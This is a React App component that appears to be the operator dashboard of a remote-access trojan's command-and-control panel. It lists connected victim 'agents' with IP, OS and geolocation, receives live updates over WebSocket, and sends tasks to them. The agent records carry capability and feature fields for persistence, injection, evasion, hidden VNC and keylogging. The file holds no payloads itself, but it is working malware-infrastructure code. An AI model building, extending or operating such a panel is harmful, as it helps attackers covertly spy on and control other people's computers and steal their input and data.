import React, { useState, useEffect } from 'react';
import { Toaster } from 'react-hot-toast';
import { ThemeProvider } from './contexts/ThemeContext';
import { NotificationProvider } from './contexts/NotificationContext';
import DashboardPage from './pages/DashboardPage';
import ThemeLoginPage from './components/ThemeLoginPage';
import TransferModal from './TransferModal';
import TasksModal from './components/TasksModal';
import { Agent } from './types';
import agentService from './services/agentService';
import toast from 'react-hot-toast';
import { wsIntegration } from './utils/integration';

export default function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [tableData, setTableData] = useState<Agent[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [modalStatus, setModalStatus] = useState(false);
  const [tasksModalStatus, setTasksModalStatus] = useState(false);
  const [selectedUser, setSelectedUser] = useState<Agent | null>(null);

  // Check for existing authentication on app startup
  useEffect(() => {
    const token = localStorage.getItem('accessToken');
    const isAuthStored = localStorage.getItem('isAuthenticated') === 'true';
    
    // Load saved theme on startup
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme) {
      document.documentElement.setAttribute('data-theme', savedTheme);
    }
    
    if (token && isAuthStored) {
      setIsAuthenticated(true);
      setIsLoading(false);
    } else {
      setIsLoading(false);
    }
  }, []);

  const initWebSocket = () => {
    const token = localStorage.getItem('accessToken') || '';
    console.log('Initializing WebSocket with token:', token);
    
    const handleMessage = (data: any) => {
      console.log('WebSocket message received:', data);
      wsIntegration.handleMessage(data, {
        onClientUpdate: (clients: any[]) => {
          console.log('onClientUpdate called with clients:', clients);
          if (Array.isArray(clients)) {
            if (clients.length === 1) {
              // Single client update - convert Client to Agent format
              console.log('Single client update:', clients[0]);
              setTableData(prevData => {
                const clientData = clients[0];
                const agentData: Agent = {
                  _id: clientData._id,
                  id: clientData.uuid || clientData.id,
                  name: clientData.computerName || clientData.name || 'Unknown',
                  computerName: clientData.computerName || 'Unknown',
                  hostname: clientData.hostname,
                  ip: clientData.ipAddress || clientData.ip || 'Unknown',
                  ipAddress: clientData.ipAddress || clientData.ip || 'Unknown',
                  platform: clientData.platform || 'unknown',
                  operatingSystem: clientData.operatingSystem || clientData.platform || 'unknown',
                  osVersion: clientData.osVersion || 'Unknown',
                  architecture: clientData.architecture || 'unknown',
                  status: clientData.status || 'offline',
                  lastSeen: clientData.lastSeen || clientData.lastActiveTime || new Date().toISOString(),
                  lastActiveTime: clientData.lastActiveTime || new Date().toISOString(),
                  lastHeartbeat: clientData.lastHeartbeat,
                  connectionCount: clientData.connectionCount || 0,
                  version: clientData.version || '1.0.0',
                  country: clientData.country || 'Unknown',
                  capabilities: clientData.capabilities || {
                    persistence: [],
                    injection: [],
                    evasion: [],
                    commands: [],
                    features: []
                  },
                  features: {
                    hvnc: false,
                    keylogger: false,
                    screenCapture: false,
                    fileManager: false,
                    processManager: false
                  },
                  geoLocation: clientData.geoLocation,
                  systemInfo: clientData.systemInfo
                };
                
                const updatedData = prevData.map(agent => 
                  agent.id === agentData.id ? agentData : agent
                );
                // Add new agent if not exists
                if (!prevData.find(agent => agent.id === agentData.id)) {
                  updatedData.push(agentData);
                }
                return updatedData;
              });
              toast.success(`Client ${clients[0].computerName || clients[0].name} is now ${clients[0].status}`);
            } else {
              // Full client list update - convert all clients to agents
              console.log('Full client list update with', clients.length, 'clients');
              const agentList: Agent[] = clients.map(clientData => ({
                _id: clientData._id,
                id: clientData.uuid || clientData.id,
                name: clientData.computerName || clientData.name || 'Unknown',
                computerName: clientData.computerName || 'Unknown',
                hostname: clientData.hostname,
                ip: clientData.ipAddress || clientData.ip || 'Unknown',
                ipAddress: clientData.ipAddress || clientData.ip || 'Unknown',
                platform: clientData.platform || 'unknown',
                operatingSystem: clientData.operatingSystem || clientData.platform || 'unknown',
                osVersion: clientData.osVersion || 'Unknown',
                architecture: clientData.architecture || 'unknown',
                status: clientData.status || 'offline',
                lastSeen: clientData.lastSeen || clientData.lastActiveTime || new Date().toISOString(),
                lastActiveTime: clientData.lastActiveTime || new Date().toISOString(),
                lastHeartbeat: clientData.lastHeartbeat,
                connectionCount: clientData.connectionCount || 0,
                version: clientData.version || '1.0.0',
                country: clientData.country || 'Unknown',
                capabilities: clientData.capabilities || {
                  persistence: [],
                  injection: [],
                  evasion: [],
                  commands: [],
                  features: []
                },
                features: {
                  hvnc: false,
                  keylogger: false,
                  screenCapture: false,
                  fileManager: false,
                  processManager: false
                },
                geoLocation: clientData.geoLocation,
                systemInfo: clientData.systemInfo
              }));
              console.log('Setting table data with', agentList.length, 'agents');
              setTableData(agentList);
            }
          }
        },

        onError: (error: string) => {
          console.error('WebSocket error:', error);
          toast.error(`WebSocket error: ${error}`);
        }
      });
    };
    
    const ws = wsIntegration.createConnection(token, handleMessage);
    
    // Add onmessage handler to send web_client identification after auth_success
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        // If authentication was successful, send web_client identification
        if (data.type === 'auth_success') {
          console.log('Authentication successful, sending web_client identification');
          ws.send(JSON.stringify({ type: 'web_client' }));
          // Force refresh client list after authentication
          setTimeout(() => {
            console.log('Force refreshing client list after authentication');
            getUserList();
          }, 1000);
        }
        
        handleMessage(data);
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };
    
    // We don't need to override onopen here since wsIntegration.createConnection already handles auth
    // The auth message is sent in wsIntegration.createConnection
    // We'll handle web_client identification in the onmessage handler after auth_success

    ws.onerror = (error) => {
      console.error('WebSocket Error:', error);
      toast.error('WebSocket connection error.');
    };

    ws.onclose = () => {
      console.log('Disconnected from WebSocket');
      // Attempt to reconnect after 3 seconds
      setTimeout(() => {
        if (isAuthenticated) {
          initWebSocket();
        }
      }, 3000);
    };
  };

  const getUserList = async () => {
    try {
      setIsLoading(true);
      console.log('Fetching client list from API...');
      const agents = await agentService.getAgents();
      console.log('API returned agents:', agents);
      if (agents) {
        setTableData(agents);
        console.log('Set table data with', agents.length, 'agents from API');
      } else {
        setTableData([]);
        console.log('No agents data returned from server');
        toast.error('No agents data returned from server.');
      }
    } catch (error: any) {
      console.error('Error fetching agent list:', error);
      toast.error('Failed to fetch agent list. Please check your authentication status.');
      // 如果是认证错误，可能需要重新登录
      if (error?.response && (error.response.status === 401 || error.response.status === 403)) {
        toast.error('Authentication error. Please login again.');
        handleLogout();
      }
    } finally {
      setIsLoading(false);
    }
  };

  const handleActionClicked = (agent: Agent) => {
    setSelectedUser(agent);
    setModalStatus(true);
  };

  const handleTasksClicked = (agent: Agent) => {
    setSelectedUser(agent);
    setTasksModalStatus(true);
  };

  const handleProcess = async (user: Agent, commandKey: string) => {
    try {
      await agentService.sendCommand(user.id, commandKey);
      toast.success(`Task sent to ${user.name}`);
      setModalStatus(false);
    } catch (error) {
      toast.error('Failed to send task.');
      console.error(error);
    }
  };

  const handleLogin = () => {
    setIsAuthenticated(true);
  };

  const handleLogout = () => {
    localStorage.removeItem('isAuthenticated');
    localStorage.removeItem('accessToken');
    setIsAuthenticated(false);
  };

  useEffect(() => {
    if (isAuthenticated) {
      initWebSocket();
      getUserList();
    }
  }, [isAuthenticated]);

  // Show loading screen while checking authentication
  if (isLoading) {
    return (
      <ThemeProvider>
        <div className="min-h-screen bg-gray-900 flex items-center justify-center">
          <div className="text-white text-xl">Loading...</div>
        </div>
      </ThemeProvider>
    );
  }

  if (!isAuthenticated) {
    return (
      <ThemeProvider>
        <ThemeLoginPage onLogin={() => setIsAuthenticated(true)} />
      </ThemeProvider>
    );
  }

  return (
    <ThemeProvider>
      <NotificationProvider>
        <Toaster position="top-right" />
        {selectedUser && (
          <TransferModal
            isOpen={modalStatus}
            setIsOpen={setModalStatus}
            handleProcess={handleProcess}
            user={selectedUser}
          />
        )}
        {selectedUser && (
          <TasksModal
            isOpen={tasksModalStatus}
            setIsOpen={setTasksModalStatus}
            user={selectedUser}
          />
        )}
        <DashboardPage
          tableData={tableData}
          isLoading={isLoading}
          onActionClicked={handleActionClicked}
          onTasksClicked={handleTasksClicked}
          onLogout={handleLogout}
        />
      </NotificationProvider>
    </ThemeProvider>
   );
}
